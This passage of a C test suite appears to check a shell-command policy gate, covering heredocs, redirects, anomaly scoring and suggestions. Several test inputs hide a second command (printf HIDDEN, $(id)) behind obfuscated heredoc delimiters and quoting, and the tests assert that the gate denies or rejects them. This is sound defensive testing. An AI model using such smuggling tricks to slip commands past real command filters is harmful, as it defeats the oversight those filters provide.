  at += 10;
  memset(command + at, 'E', delimiter_length);
  at += delimiter_length;
  command[at++] = '\n';
  command[at] = '\0';
  snprintf(nested, sizeof(nested), "echo \"$(%s)\"", command);
  sg_gate_t *gate = gate_with_rules((const char *[]){"cat", "echo *"}, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 1e300, NULL));
  for (unsigned variant = 0; variant < 2; variant++) {
    for (unsigned pass = 0; pass < 3; pass++) {
      sg_result_t result;
      ASSERT_SG_OK(eval_cmd(gate, variant ? nested : command, &result));
      ASSERT(result.verdict ==
                 (variant ? SG_VERDICT_ALLOW_CONDITIONAL : SG_VERDICT_ALLOW) &&
             !result.truncated);
      ASSERT(result.subcommand_count == (variant ? 2 : 1));
      ASSERT(result.anomaly_update == SG_ANOMALY_UPDATE_APPLIED);
    }
  }
  ASSERT(test_anomaly_vocabulary(gate) > 0);
  /* Protected ANSI-C spelling survives the later double-quote-removal state.
   * This delimiter expands beyond its header's source length. */
  static const char opening[] = "cat <<`\"`$'";
  at = sizeof(opening) - 1;
  memcpy(command, opening, at);
  for (unsigned i = 0; i < 300; i++) {
    memcpy(command + at, "\\'", 2);
    at += 2;
  }
  memcpy(command + at, "'\npayload\n``'", 13);
  at += 13;
  for (unsigned i = 0; i < 300; i++) {
    memcpy(command + at, "'\\''", 4);
    at += 4;
  }
  memcpy(command + at, "'\n", 3);
  snprintf(nested, sizeof(nested), "echo \"$(%s)\"", command);
  for (unsigned variant = 0; variant < 2; variant++) {
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, variant ? nested : command, &result));
    ASSERT(result.verdict ==
               (variant ? SG_VERDICT_ALLOW_CONDITIONAL : SG_VERDICT_ALLOW) &&
           !result.truncated);
    ASSERT(result.subcommand_count == (variant ? 2 : 1));
    ASSERT(result.anomaly_update == SG_ANOMALY_UPDATE_APPLIED);
  }
  sg_gate_free(gate);
}

TEST(heredoc_phase_policy_boundary) {
  static const char source[] =
      "cat <<`\"`$'\\x3a'\n``':'\nprintf 'HIDDEN\\n'\n``:\n:\n";
  sg_gate_t *gate = gate_with_rules((const char *[]){"cat", ":"}, 2);
  ASSERT(gate != NULL);
  ASSERT_ST_OK(test_policy_replace_cpl(gate, true, "printf *", false));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, source, &result));
  ASSERT(result.verdict == SG_VERDICT_DENY && result.subcommand_count == 4 &&
         !result.truncated);
  ASSERT(result.subcommands[0].verdict == SG_VERDICT_ALLOW &&
         result.subcommands[1].verdict == SG_VERDICT_DENY);
  static const char *const exposed[] = {
      "cat <<$(: >&-file)\n$(: file 1>&-)\nprintf HIDDEN\n$(: >&-file)\n:\n",
      "cat <<\"${x:-$'\\0'}\"\n${x:-\nprintf HIDDEN\n${x:-}\n:\n",
      ("cat <<\"${\\\n#x:-$'a'}\"\n${#x:-a}\nprintf HIDDEN\nexit 0\n"
       "${#x:-'a'}\n:\n"),
  };
  for (size_t c = 0; c < sizeof(exposed) / sizeof(exposed[0]); c++) {
    ASSERT_SG_OK(eval_cmd(gate, exposed[c], &result));
    ASSERT(result.verdict == SG_VERDICT_DENY && !result.truncated);
    ASSERT(result.subcommand_count >= 2 &&
           result.subcommands[0].verdict == SG_VERDICT_ALLOW &&
           result.subcommands[1].verdict == SG_VERDICT_DENY);
  }
  static const char continued_control[] =
      "cat <<$(i\\\nf true; th\\\nen :; f\\\ni)\n";
  ASSERT(eval_cmd(gate, continued_control, &result) == SG_ERR_PARSE);
  ASSERT(result.verdict == SG_VERDICT_REJECT && !result.truncated);
  static const char reprinted[] =
      "echo \"$(cat << -EOF\npayload\nEOF\nprintf EXPOSED\n-EOF\n)\"";
  ASSERT(eval_cmd(gate, reprinted, &result) == SG_ERR_PARSE);
  ASSERT(result.verdict == SG_VERDICT_REJECT && !result.truncated);
  sg_gate_free(gate);
}

TEST(anomaly_mixed_heredoc_substitution_contract) {
  static const char command[] =
      "cat <<EOF\n$(</tmp/mixed-file)$(id)$(printf one; printf two)\nEOF";
  sg_gate_t *gate =
      gate_with_rules((const char *[]){"cat", "id", "printf *"}, 3);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 1e300, NULL));

  sg_result_t result;
  for (size_t pass = 0; pass < 6; pass++) {
    ASSERT_SG_OK(eval_cmd(gate, command, &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
    ASSERT(result.requires_substitution_evaluation);
    ASSERT(result.subcommand_count == 4);
    /* Five nested execution stages are scoreable from the first complete
     * learned observation onward; the empty model correctly reports unknown
     * on the first pass. */
    if (pass == 0) {
      ASSERT(isinf(result.anomaly_score));
      ASSERT(isinf(result.anomaly_score_raw));
      ASSERT(isinf(result.anomaly_score_type));
    } else {
      ASSERT(isfinite(result.anomaly_score));
      ASSERT(isfinite(result.anomaly_score_raw));
      ASSERT(isfinite(result.anomaly_score_type));
    }
  }

  size_t vocabulary = test_anomaly_vocabulary(gate);
  ASSERT(vocabulary > 0);
  ASSERT_SG_OK(sg_gate_set_anomaly_update_mode(gate, true));
  sg_result_t first;
  sg_result_t second;
  ASSERT_SG_OK(eval_cmd(gate, command, &first));
  ASSERT_SG_OK(eval_cmd(gate, command, &second));
  ASSERT(isfinite(first.anomaly_score) &&
         first.anomaly_score == second.anomaly_score);
  ASSERT(first.anomaly_score_raw == second.anomaly_score_raw);
  ASSERT(first.anomaly_score_type == second.anomaly_score_type);
  ASSERT_EQ_UINT(test_anomaly_vocabulary(gate), vocabulary);
  sg_gate_free(gate);
}

/* --- SUGGESTIONS --- */

TEST(suggestion_matrix) {
  static const struct {
    const char *rules[2];
    size_t rule_count;
    const char *command;
    bool enabled;
    size_t minimum_count;
    size_t maximum_count;
    const char *suggestion_fragment;
  } cases[] = {
      {{"cat #path", "ls"}, 2, "cat", true, 1, 2, "cat"},
      {{"cat #path", "cat #path #path"}, 2, "cat", true, 1, 1, "cat"},
      {{"lss", NULL}, 1, "ls", true, 1, 2, "ls"},
      {{"lss", NULL}, 1, "ls", false, 0, 0, NULL},
  };

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *g = gate_with_rules(cases[i].rules, cases[i].rule_count);
    ASSERT_SG_OK(sg_gate_set_suggestions(g, cases[i].enabled));
    sg_result_t r;
    ASSERT(eval_cmd(g, cases[i].command, &r) == SG_OK);
    ASSERT(r.verdict == SG_VERDICT_UNDETERMINED);
    if (!cases[i].enabled) {
      ASSERT(r.suggestion_count == 0);
    } else {
      ASSERT(r.suggestion_count >= cases[i].minimum_count);
      ASSERT(r.suggestion_count <= cases[i].maximum_count);
      for (size_t j = 0; j < r.suggestion_count; j++) {
        ASSERT(r.suggestions[j] != NULL);
        ASSERT(r.suggestions[j][0] != '\0');
      }
      ASSERT(strstr(r.suggestions[0], cases[i].suggestion_fragment) != NULL);
    }
    sg_gate_free(g);
  }
}

TEST(match_only_path_avoids_suggestion_allocations) {
  sg_gate_t *gate = gate_with_rules((const char *[]){"lss"}, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "ls", &result));

  st_test_alloc_reset();
  ASSERT_SG_OK(eval_cmd(gate, "ls", &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT(result.suggestion_count == 0 && result.deny_suggestion_count == 0);
  ASSERT(st_test_alloc_count() == 0);
  st_test_alloc_reset();
  sg_gate_free(gate);
}

TEST(complete_and_oversized_suggestions) {
  sg_gate_t *gate = gate_with_rules((const char *[]){"tool #size.MiB done"}, 1);
  ASSERT(gate != NULL);
  ASSERT_ST_OK(
      test_policy_replace_cpl(gate, true, "tool #size.MiB done", false));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, true));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "tool 10GB 'a b'", &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT(result.suggestion_count == 2 && result.deny_suggestion_count == 2);
  for (size_t i = 0; i < 2; i++) {
    ASSERT(strstr(result.suggestions[i], "\"a b\"") != NULL);
    ASSERT(strstr(result.deny_suggestions[i], "\"a b\"") != NULL);
  }
  char command[306] = "tool /";
  memset(command + 6, 'z', sizeof(command) - 7);
  command[sizeof(command) - 1] = '\0';
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT(result.suggestion_count == 1 && result.deny_suggestion_count == 1);
  ASSERT(strcmp(result.suggestions[0], "tool #p") == 0 &&
         strcmp(result.suggestions[0], result.deny_suggestions[0]) == 0);

  /* Recovered representation limits must not hide later allocation failures. */
  st_test_alloc_reset();
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  size_t allocations = st_test_alloc_count();
  st_test_alloc_reset();
  ASSERT(allocations > 0);
  bool saw_memory = false;
  for (size_t fail_at = 1; fail_at <= allocations; fail_at++) {
    st_test_alloc_fail_at(fail_at);
    sg_error_t error = eval_cmd(gate, command, &result);
    st_test_alloc_reset();
    if (error == SG_ERR_MEMORY) {
      saw_memory = true;
      ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
    } else {
      ASSERT(error == SG_OK && result.verdict == SG_VERDICT_UNDETERMINED);
    }
  }
  ASSERT(saw_memory);
  sg_gate_free(gate);
}

/* --- EDGE CASES --- */

TEST(eval_input_contract_matrix) {
  static const struct {
    const char *name;
    const char *command;
    sg_error_t error;
    sg_verdict_t verdict;
    bool add_rule;
  } cases[] = {
      {"empty", "", SG_ERR_INVALID, SG_VERDICT_UNDETERMINED, false},
      {"whitespace", "   ", SG_OK, SG_VERDICT_ALLOW, true},
      {"unterminated quote", "echo \"unclosed", SG_ERR_PARSE, SG_VERDICT_REJECT,
       false},
      {"nested heredoc outside dialect", "echo $(cat <<EOF\nbody\nEOF)",
       SG_ERR_PARSE, SG_VERDICT_REJECT, false},
      {"nested unsupported construct", "echo $(case value in x)", SG_ERR_PARSE,
       SG_VERDICT_REJECT, false},
      {"bash conditional command", "[[ -f /tmp/x ]]", SG_OK, SG_VERDICT_REJECT,
       false},
      {"bash arithmetic command", "(( count += 1 ))", SG_OK, SG_VERDICT_REJECT,
       false},
      {"continued bash arithmetic command", "(\\\n( count += 1 ))", SG_OK,
       SG_VERDICT_REJECT, false},
      {"continued bash conditional command", "[\\\n[ -n value ]]", SG_OK,
       SG_VERDICT_REJECT, false},
      {"continued bash conditional delimiter", "[[\\\n -n value ]]", SG_OK,
       SG_VERDICT_REJECT, false},
      {"time pipeline modifier", "time -p echo x", SG_OK,
       SG_VERDICT_UNDETERMINED, false},
      {"quoted array declaration builtin", "\"declare\" -a values",
       SG_ERR_PARSE, SG_VERDICT_REJECT, false},
      {"composed ANSI-C declaration builtin", "de$'clare' -a values",
       SG_ERR_PARSE, SG_VERDICT_REJECT, false},
      {"quoted declaration array option", "declare \"-a\" values", SG_ERR_PARSE,
       SG_VERDICT_REJECT, false},
      {"composed ANSI-C declaration wrapper option",
       "command -$'p' de$'clare' -a values", SG_ERR_PARSE, SG_VERDICT_REJECT,
       false},
      {"quoted declaration array assignment", "declare \"items[0]=value\"",
       SG_ERR_PARSE, SG_VERDICT_REJECT, false},
      {"bash locale quote", "printf '%s' $\"localized\"", SG_ERR_PARSE,
       SG_VERDICT_REJECT, false},
      {"bash combined redirect", "cmd &>file", SG_OK, SG_VERDICT_UNDETERMINED,
       false},
      {"bash legacy combined redirect", "cmd >&file", SG_OK,
       SG_VERDICT_UNDETERMINED, false},
      {"literal-dollar legacy combined redirect", "cmd >&$", SG_OK,
       SG_VERDICT_UNDETERMINED, false},
      {"literal-dollar-colon legacy combined redirect", "cmd >&$:", SG_OK,
       SG_VERDICT_UNDETERMINED, false},
      {"literal-bracket legacy combined redirect", "cmd >&[", SG_OK,
       SG_VERDICT_UNDETERMINED, false},
      {"literal-unmatched-bracket legacy combined redirect", "cmd >&file[part",
       SG_OK, SG_VERDICT_UNDETERMINED, false},
      {"bash explicit legacy combined redirect", "cmd 1>&file", SG_OK,
       SG_VERDICT_UNDETERMINED, false},
      {"legacy combined input process substitution", "cmd >& <(producer)",
       SG_OK, SG_VERDICT_UNDETERMINED, false},
      {"literal-brace legacy combined redirect", "cmd >&file{literal}", SG_OK,
       SG_VERDICT_UNDETERMINED, false},
      {"parameter-prefixed legacy combined redirect", "cmd >&literal$path",
       SG_OK, SG_VERDICT_UNDETERMINED, false},
      {"braced-parameter-prefixed legacy combined redirect",
       "cmd >&literal${path}", SG_OK, SG_VERDICT_UNDETERMINED, false},
      {"arithmetic-prefixed legacy combined redirect",
       "cmd >&literal$((1 + 2))", SG_OK, SG_VERDICT_REJECT, false},
      {"quoted-prefix legacy combined redirect",
       "cmd >&\"\"literal$(printf target)", SG_OK, SG_VERDICT_UNDETERMINED,
       false},
      {"brace-expansion-prefixed legacy combined redirect",
       "cmd >&file{one,two}", SG_OK, SG_VERDICT_UNDETERMINED, false},
      {"dynamic legacy combined redirect", "cmd >&~", SG_ERR_PARSE,
       SG_VERDICT_REJECT, false},
      {"glob-suffix legacy combined redirect", "cmd >&*.log", SG_OK,
       SG_VERDICT_UNDETERMINED, false},
      {"bare glob legacy combined redirect", "cmd >&*", SG_ERR_PARSE,
       SG_VERDICT_REJECT, false},
      {"extglob legacy combined redirect", "cmd >&@(file)", SG_ERR_PARSE,
       SG_VERDICT_REJECT, false},
      {"continued-tilde legacy combined redirect", "cmd >&\\\n~", SG_ERR_PARSE,
       SG_VERDICT_REJECT, false},
      {"ambiguous command-substitution legacy redirect", "cmd >&$(printf 2)",
       SG_ERR_PARSE, SG_VERDICT_REJECT, false},
      {"ambiguous backtick legacy redirect", "cmd >&`printf 2`", SG_ERR_PARSE,
       SG_VERDICT_REJECT, false},
      {"overflowed legacy descriptor target", "cmd >&2147483648", SG_ERR_PARSE,
       SG_VERDICT_REJECT, false},
      {"zero-padded overflowed legacy descriptor target",
       "cmd >&00000000000000000000000000000000002147483648", SG_ERR_PARSE,
       SG_VERDICT_REJECT, false},
      {"empty legacy descriptor target", "cmd >&\"\"", SG_OK,
       SG_VERDICT_UNDETERMINED, false},
      {"truncated legacy pathname", "cmd >&$'a\\0b'", SG_OK,
       SG_VERDICT_UNDETERMINED, false},
  };

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *g = sg_gate_new();
    ASSERT(g != NULL);
    if (cases[i].add_rule)
      ASSERT_ST_OK(test_policy_replace_cpl(g, false, "ls", false));
    sg_result_t result = {0};
    sg_error_t error = eval_cmd(g, cases[i].command, &result);
    if (error != cases[i].error ||
        (error != SG_ERR_INVALID && result.verdict != cases[i].verdict)) {
      fprintf(stderr, "input case failed: %s\n", cases[i].name);
      fail_count++;
    }
    if (error == SG_ERR_PARSE) {
      ASSERT(result.subcommand_count == 1);
    }
    sg_gate_free(g);
  }
}

/* `&>` and `&>>` do not have an io-number or `{name}` descriptor form. A
 * prefix therefore remains an argv word for a simple command, while the same
 * text after a compound group is not a legal group redirect list. Keep this
 * boundary at Shellgate's public API so policy evaluation cannot silently see
 * a different command from Shellsplit's canonical records. */
TEST(combined_redirect_prefix_word_contract) {
  static const struct {
    const char *command;
    const char *rule;
  } direct[] = {
      {"printf x 2&>combined", "printf x 2"},
      {"printf x 3&>>combined", "printf x 3"},
      {"printf x {fd}&>combined", "printf x {fd}"},
  };
  for (size_t i = 0; i < sizeof(direct) / sizeof(direct[0]); i++) {
    sg_gate_t *gate = sg_gate_new();
    ASSERT(gate != NULL);
    ASSERT_SG_OK(add_exact_outer_rule(gate, direct[i].rule));
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, direct[i].command, &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1);
    sg_gate_free(gate);
  }

  static const char *const invalid_groups[] = {
      "{ printf x; } 2&>combined",
      "{ printf x; } 3&>>combined",
      "{ printf x; } {fd}&>combined",
  };
  for (size_t i = 0; i < sizeof(invalid_groups) / sizeof(invalid_groups[0]);
       i++) {
    sg_gate_t *gate = sg_gate_new();
    ASSERT(gate != NULL);
    sg_result_t result = {0};
    ASSERT(eval_cmd(gate, invalid_groups[i], &result) == SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT);
    sg_gate_free(gate);
  }
}

/* A redirect-only list element is syntactically valid but has no argv to
 * compare with policy. Preserve the graph-derived violation information and
 * its complete anomaly-stage representation without inventing a policy
 * subject. */
TEST(redirect_only_operation_is_undetermined) {
  static const char *const rules[] = {"echo ok"};
  static const sg_stop_mode_t modes[] = {
      SG_EVAL_ALL,         SG_STOP_FIRST_FAIL, SG_STOP_FIRST_PASS,
      SG_STOP_FIRST_ALLOW, SG_STOP_FIRST_DENY,
  };
  static const char *const reason =
      "redirect-only shell operation is not argv-policy-evaluable";
  static const char *const target = "/tmp/shellgate-redirect-only";
  sg_gate_t *gate = gate_with_rules(rules, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));

  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.sensitive_write_paths[0] = target;
  config.sensitive_write_path_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));

  shell_netstring_buffer_t raw_sequence = {0};
  shell_netstring_buffer_t type_sequence = {0};
  size_t sequence_count = 0;
  ASSERT(shell_build_anomaly_netseqs_buffer(
             "echo ok; >/tmp/shellgate-redirect-only",
             strlen("echo ok; >/tmp/shellgate-redirect-only"), NULL,
             &raw_sequence, &type_sequence,
             &sequence_count) == SHELL_PROCESS_OK);
  ASSERT_EQ_UINT(sequence_count, 2);
  ASSERT((raw_sequence.length != sizeof("4:echo,0:,") - 1 ||
          memcmp(raw_sequence.data, "4:echo,0:,", raw_sequence.length)) == 0);
  ASSERT((type_sequence.length != sizeof("13:4:echo,3:STR,,3:0:,,") - 1 ||
          memcmp(type_sequence.data, "13:4:echo,3:STR,,3:0:,,",
                 type_sequence.length)) == 0);
  sg_anomaly_sequence_score_t sequence_score = {0};
  ASSERT_SG_OK(sg_gate_score_anomaly_netseq(
      gate, (const char *)raw_sequence.data, raw_sequence.length,
      (const char *)type_sequence.data, type_sequence.length, &sequence_score));
  ASSERT_EQ_UINT(sequence_score.stage_count, 2);
  shell_netstring_buffer_free(&raw_sequence);
  shell_netstring_buffer_free(&type_sequence);

  size_t vocabulary = test_anomaly_vocabulary(gate);
  for (size_t i = 0; i < sizeof(modes) / sizeof(modes[0]); i++) {
    ASSERT_SG_OK(sg_gate_set_stop_mode(gate, modes[i]));
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, ">/tmp/shellgate-redirect-only", &result));
    ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
    ASSERT(result.subcommand_count == 0);
    ASSERT_STR(result.deny_reason, reason);
    ASSERT(!result.truncated && !result.short_circuited);
    ASSERT(result.has_violations);
    ASSERT(result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE);
    ASSERT(test_anomaly_vocabulary(gate) >= vocabulary);
    vocabulary = test_anomaly_vocabulary(gate);
  }

  sg_result_t result = {0};
  ASSERT_SG_OK(
      eval_cmd(gate, "echo ok; >/tmp/shellgate-redirect-only", &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT(result.subcommand_count == 1);
  ASSERT(result.subcommands[0].matches);
  ASSERT(result.subcommands[0].verdict == SG_VERDICT_ALLOW);
  ASSERT_STR(result.deny_reason, reason);
  ASSERT(result.has_violations);
  ASSERT(result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE);
  ASSERT(test_anomaly_vocabulary(gate) >= vocabulary);
  sg_gate_free(gate);

  /* The default anomaly mode learns complete stage sequences regardless of
   * policy verdict. The allow-only mode retains its documented restriction. */
  sg_gate_t *allow_only_gate = gate_with_rules(rules, 1);
  ASSERT(allow_only_gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(allow_only_gate, 0));
  ASSERT_SG_OK(sg_gate_enable_anomaly(allow_only_gate, 100.0, NULL));
  ASSERT_SG_OK(sg_gate_set_anomaly_update_mode(allow_only_gate, true));
  memset(&result, 0, sizeof(result));
  ASSERT_SG_OK(eval_cmd(allow_only_gate,
                        "echo ok; >/tmp/shellgate-redirect-only", &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT_EQ_UINT(test_anomaly_vocabulary(allow_only_gate), 0);
  sg_gate_free(allow_only_gate);

  /* An argv-less operation prevents an all-allow result, but cannot erase a
   * definite policy decision made for another subcommand. */
  sg_gate_t *deny_gate = sg_gate_new();
  ASSERT(deny_gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(deny_gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(deny_gate, SG_EVAL_ALL));
  ASSERT_ST_OK(test_policy_replace_cpl(deny_gate, true, "blocked", false));
  memset(&result, 0, sizeof(result));
  ASSERT_SG_OK(
      eval_cmd(deny_gate, "blocked; >/tmp/shellgate-redirect-only", &result));
  ASSERT(result.verdict == SG_VERDICT_DENY);
  ASSERT(result.subcommand_count == 1);
  ASSERT(result.subcommands[0].verdict == SG_VERDICT_DENY);
  ASSERT(result.deny_reason != NULL && strcmp(result.deny_reason, reason) != 0);
  sg_gate_free(deny_gate);

  sg_gate_t *reject_gate = sg_gate_new();
  ASSERT(reject_gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(reject_gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(reject_gate, SHELL_FEAT_VARS));
  ASSERT_ST_OK(test_policy_replace_cpl(reject_gate, false, "echo *", false));
  memset(&result, 0, sizeof(result));
  ASSERT_SG_OK(eval_cmd(reject_gate,
                        "echo $VALUE; >/tmp/shellgate-redirect-only", &result));
  ASSERT(result.verdict == SG_VERDICT_REJECT);
  ASSERT(result.subcommand_count == 1);
  ASSERT(result.subcommands[0].verdict == SG_VERDICT_REJECT);
  ASSERT(result.deny_reason != NULL && strcmp(result.deny_reason, reason) != 0);
  sg_gate_free(reject_gate);
}

/* Named descriptor documents are redirections, not words.  Policy evaluation
 * must therefore see exactly the executable argv while anomaly sequences keep
 * the redirect-only stage (including its pipeline-negation metadata). */
TEST(named_document_policy_and_stage_contract) {
  static const char *const rules[] = {"printf x", "cat"};
  static const char *const commands[] = {
      "printf x {fd}<<<body",
      "printf x {fd}<<EOF\nbody\nEOF\n",
      "{ cat; } {fd}<<<body",
      "{ cat; } {fd}<<EOF\nbody\nEOF\n",
  };
  sg_gate_t *gate = gate_with_rules(rules, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));
  for (size_t i = 0; i < sizeof(commands) / sizeof(commands[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, commands[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1 &&
           result.subcommands[0].matches);
    ASSERT_STR(result.subcommands[0].netargv,
               i < 2 ? "6:printf,1:x," : "3:cat,");
  }

  static const char *const negated[] = {
      "! <<<body",
      "! ! <<<body",
      "! <<EOF\nbody\nEOF\n",
      "! ! <<EOF\nbody\nEOF\n",
  };
  for (size_t i = 0; i < sizeof(negated) / sizeof(negated[0]); i++) {
    shell_netstring_buffer_t raw = {0};
    shell_netstring_buffer_t type = {0};
    size_t stages = 0;
    ASSERT(shell_build_anomaly_netseqs_buffer(negated[i], strlen(negated[i]),
                                              NULL, &raw, &type,
                                              &stages) == SHELL_PROCESS_OK);
    ASSERT(stages == 1 && (raw.length != sizeof("0:,") - 1 ||
                           memcmp(raw.data, "0:,", raw.length)) == 0);
    sg_anomaly_sequence_score_t score = {0};
    ASSERT_SG_OK(sg_gate_score_anomaly_netseq(
        gate, (const char *)raw.data, raw.length, (const char *)type.data,
        type.length, &score));
    ASSERT(score.stage_count == 1);
    shell_netstring_buffer_free(&type);
    shell_netstring_buffer_free(&raw);

    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, negated[i], &result));
    ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
           result.subcommand_count == 0);
  }
  sg_gate_free(gate);
}

TEST(redirect_boundary_policy_and_anomaly_contract) {
  static const char *const rules[] = {"cat", "cat 0"};
  sg_gate_t *gates[2] = {gate_with_rules(rules, 2), gate_with_rules(rules, 2)};
  static const char *const inputs[] = {
      "{ cat; } >out; >a; >b",
      "{ cat; } >out |& >a; >b",
      "cat 0 <<<body; cat; cat",
      "cat 0<<EOF\nwhile true; do :; done\nEOF\ncat; cat",
  };
  for (size_t g = 0; g < 2; g++) {
    ASSERT(gates[g] != NULL);
    ASSERT_SG_OK(sg_gate_set_reject_mask(gates[g], 0));
    ASSERT_SG_OK(sg_gate_enable_anomaly(gates[g], 1000000.0, NULL));
    ASSERT_SG_OK(sg_gate_set_anomaly_cache_size(gates[g], g ? 8 : 0));
  }
  for (size_t round = 0; round < 3; round++) {
    for (size_t i = 0; i < sizeof(inputs) / sizeof(inputs[0]); i++) {
      shell_netstring_buffer_t raw = {0};
      shell_netstring_buffer_t typed = {0};
      size_t count = 0;
      ASSERT(shell_build_anomaly_netseqs_buffer(inputs[i], strlen(inputs[i]),
                                                NULL, &raw, &typed,
                                                &count) == SHELL_PROCESS_OK);
      ASSERT(count == 3);
      ASSERT((raw.length !=
                  strlen(i < 2 ? "3:cat,0:,0:," : "3:cat,3:cat,3:cat,") ||
              memcmp(raw.data, i < 2 ? "3:cat,0:,0:," : "3:cat,3:cat,3:cat,",
                     raw.length)) == 0);
      sg_anomaly_sequence_score_t score = {0};
      ASSERT_SG_OK(sg_gate_score_anomaly_netseq(
          gates[0], (const char *)raw.data, raw.length,
          (const char *)typed.data, typed.length, &score));
      ASSERT(score.stage_count == 3 && score.combined_score > 0.0);
      shell_netstring_buffer_free(&raw);
      shell_netstring_buffer_free(&typed);
      sg_result_t first = {0}, second = {0};
      ASSERT_SG_OK(eval_cmd(gates[0], inputs[i], &first));
      ASSERT_SG_OK(eval_cmd(gates[1], inputs[i], &second));
      ASSERT(first.verdict ==
             (i < 2 ? SG_VERDICT_UNDETERMINED : SG_VERDICT_ALLOW));
      ASSERT(first.verdict == second.verdict &&
             first.anomaly_score == second.anomaly_score &&
             first.anomaly_score_raw == second.anomaly_score_raw &&
             first.anomaly_score_type == second.anomaly_score_type);
      ASSERT(first.subcommand_count == (i < 2 ? 1u : 3u));
      if (i == 2)
        ASSERT_STR(first.subcommands[0].netargv, "3:cat,1:0,");
    }
  }
  for (size_t g = 0; g < 2; g++) {
    ASSERT_ST_OK(test_policy_replace_cpl(gates[g], true, "blocked", false));
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gates[g], "{ blocked; } >out; >a; >b", &result));
    ASSERT(result.verdict == SG_VERDICT_DENY);
    sg_gate_free(gates[g]);
  }
}

TEST(descriptor_word_policy_and_cache_contract) {
  static const char *const rules[] = {"cat", "cat x3", "cat x0"};
  static const struct {
    const char *input;
    const char *argv;
    bool empty_stage;
  } cases[] = {
      {"{ cat; } <<EOF\nbody\nEOF\n>out", "3:cat,", true},
      {"{ cat; } 1\\\n2<<EOF\nbody\nEOF\n>out", "3:cat,", true},
      {"cat $'x'3>out", "3:cat,2:x3,", false},
      {"cat $'x'0<<<body", "3:cat,2:x0,", false},
      {"cat $'x'\\\n3>out", "3:cat,2:x3,", false},
      {"cat 1\\\n2<<EOF\nbody\nEOF\n", "3:cat,", false},
      {"{ cat; } 1\\\n2<<<body", "3:cat,", false},
  };
  sg_gate_t *gates[2] = {gate_with_rules(rules, 3), gate_with_rules(rules, 3)};
  for (size_t g = 0; g < 2; g++) {
    ASSERT(gates[g] != NULL);
    ASSERT_SG_OK(sg_gate_set_reject_mask(gates[g], 0));
    ASSERT_SG_OK(sg_gate_enable_anomaly(gates[g], 1000000.0, NULL));
    ASSERT_SG_OK(sg_gate_set_anomaly_cache_size(gates[g], g ? 8 : 0));
  }
  for (size_t round = 0; round < 3; round++) {
    for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
      shell_netstring_buffer_t raw = {0};
      shell_netstring_buffer_t typed = {0};
      size_t count = 0;
      ASSERT(shell_build_anomaly_netseqs_buffer(
                 cases[i].input, strlen(cases[i].input), NULL, &raw, &typed,
                 &count) == SHELL_PROCESS_OK);
      ASSERT(count == (cases[i].empty_stage ? 2u : 1u));
      ASSERT((raw.length !=
                  strlen(cases[i].empty_stage ? "3:cat,0:," : "3:cat,") ||
              memcmp(raw.data, cases[i].empty_stage ? "3:cat,0:," : "3:cat,",
                     raw.length)) == 0);
      shell_netstring_buffer_free(&raw);
      shell_netstring_buffer_free(&typed);
      sg_result_t results[2] = {{0}, {0}};
      for (size_t g = 0; g < 2; g++) {
        ASSERT_SG_OK(eval_cmd(gates[g], cases[i].input, &results[g]));
        ASSERT(results[g].verdict == (cases[i].empty_stage
                                          ? SG_VERDICT_UNDETERMINED
                                          : SG_VERDICT_ALLOW));
